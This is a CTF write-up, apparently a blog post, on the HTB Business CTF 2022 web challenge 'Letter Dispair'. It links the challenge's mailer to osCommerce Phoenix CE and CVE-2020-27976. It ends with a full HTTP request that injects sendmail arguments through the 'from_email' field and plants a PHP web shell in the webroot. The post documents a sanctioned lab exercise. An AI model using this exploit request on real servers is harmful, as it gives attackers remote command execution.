---
date: 2022-07-18
authors:
  - techbrunch
tags:
  - CTF
categories:
  - web
description: We need access to the server to read the logs and find out the actual perpetrator. Can you help?
---

# HTB Business CTF 2022 - Letter Dispair

> A high-profile political individual was a victim of a spear-phishing attack. The email came from a legitimate 
> government entity in a nation we don't have jurisdiction. However, we have traced the originating mail to a government
> webserver. Further enumeration revealed an open directory index containing a PHP mailer script we think was used to 
> send the email. We need access to the server to read the logs and find out the actual perpetrator. Can you help?

<!-- more -->

In the webroot we can see a mailer.php and a mailer.zip containing the source code. Reviewing the source code does not 
reveal any obvious vulnerabilities.

Let's think outside the box for a minute. While not that big, the code does not look like it was written specifically for
this CTF.

There could be two options:

- The vulnerability was introduced into existing code to create the challenge
- The vulnerability was found in a real application

Let's see if we can find the original code. A [quick search](https://cs.github.com/?scopeName=All+repos&scope=&q=%22%24images_dir%24html_image%22) 
on the new [GitHub search](https://cs.github.com/) for `$images_dir$html_image` reveals
the [original source](https://cs.github.com/gburton/CE-Phoenix/blob/43c52c27af71ce48a35a77daa78ff640e65bbc33/includes/system/versioned/1.0.4.5/email.php?q=%22%24images_dir%24html_image%22#L121). 
The vulnerable code comes from the Community Edition of Phoenix a fork of [OsCommerce](OsCommerce), an e-commerce and 
online store-management software program

Let's see if there are known vulnerabilities for osCommerce. There is one rated 10/10 that looks like it fits [CVE-2020-27976](https://www.cvedetails.com/cve/CVE-2020-27976/):

>  osCommerce Phoenix CE before 1.0.5.4 allows OS command injection remotely. Within admin/mail.php, a from POST 
> parameter can be passed to the application. This affects the PHP mail function, and the sendmail -f option.

Another search on GitHub leads to a [POC for CVE-2020-27976](https://github.com/k0rnh0li0/CVE-2020-27976) that can be used to upload a webshell that was then used to read the FLAG:

```
POST /mailer.php HTTP/1.1
Host: 178.62.26.185:30977
Content-Length: 854
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://178.128.168.214:32106
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1zAk5EgmTo1AA34o
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://178.128.168.214:32106/mailer.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary1zAk5EgmTo1AA34o
Content-Disposition: form-data; name="from_email"

test@localhost -OQueueDirectory=/tmp -X/var/www/html/poc.php
------WebKitFormBoundary1zAk5EgmTo1AA34o
Content-Disposition: form-data; name="from_name"

Ministry
------WebKitFormBoundary1zAk5EgmTo1AA34o
Content-Disposition: form-data; name="subject"

<?php echo "Shell";system($_GET['cmd']); ?>
------WebKitFormBoundary1zAk5EgmTo1AA34o
Content-Disposition: form-data; name="email_body"

Dear ^emailuser^, ...
------WebKitFormBoundary1zAk5EgmTo1AA34o
Content-Disposition: form-data; name="email_list"

test@1cedpwwkwg7n80ci7fainnoib9hz5o.oastify.com
------WebKitFormBoundary1zAk5EgmTo1AA34o
Content-Disposition: form-data; name="attachment"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundary1zAk5EgmTo1AA34o--
```
